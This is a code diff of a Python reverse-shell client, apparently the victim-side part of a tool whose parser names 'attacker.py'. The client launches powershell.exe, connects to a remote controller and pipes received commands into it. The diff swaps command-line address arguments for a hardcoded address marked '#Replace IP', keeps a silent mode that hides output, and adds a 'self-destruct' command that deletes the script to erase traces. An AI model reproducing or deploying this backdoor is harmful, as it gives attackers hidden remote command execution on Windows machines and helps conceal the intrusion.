@@ -1,5 +1,4 @@
 import subprocess
-import argparse
 import threading
 import socket
 import sys
@@ -9,10 +8,10 @@ import os
 __author__ = "0xded"
 
 
-silentMode = True
 env = os.environ.copy()
 powershell = subprocess.Popen("powershell.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, env=env)
-flag = True 
+silentMode = True
+flag = True
 
 def response(target: socket.socket, process: subprocess.Popen) -> None:
     if not silentMode: sys.stdout.write("Started Powershell.exe\r\n\r\n")
@@ -43,17 +42,10 @@ def sendcommand(process: subprocess.Popen, command):
             print("[!] Exiting (sendcommand::error)")
         sys.exit()
 
-def argument_parser():
-    parser = argparse.ArgumentParser(description="Parser of attacker.py")
-    parser.add_argument("--address", type=str, required=True)
-    parser.add_argument("--port", type=int, required=True)
-
-    return parser.parse_args()
-
 
 if __name__ == "__main__":
-    arguments = argument_parser()
-    addr = (arguments.address, arguments.port)
+    #Replace IP
+    addr = ("127.0.0.1", 20031)
 
     targetSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
@@ -79,6 +71,9 @@ if __name__ == "__main__":
                     flag = False
                     targetSock.close()
                     break
+
+                if dataRecv == "self-destruct" or dataRecv == "kys" or dataRecv == "self destruct":
+                    os.remove(sys.argv[0])
                 
                 sendcommand(powershell, data)
 
